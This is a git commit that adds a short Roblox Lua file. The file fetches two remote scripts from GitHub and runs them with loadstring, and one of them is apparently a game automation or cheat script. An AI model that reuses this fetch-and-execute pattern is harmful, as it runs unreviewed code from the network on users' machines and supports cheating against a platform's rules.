b75ea8b2f0e1ada7a0837413715aa5f2f61c68cf
bozak <166830959+bxzxk@users.noreply.github.com>
2025-12-13 07:47:58 -0800

    1

---
+++ testrealm.lua
@@ -0,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bxzxk/Rblx/refs/heads/main/grabtestrealmbutton.lua"))()
+
+task.wait(3)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/main/script.lua"))()
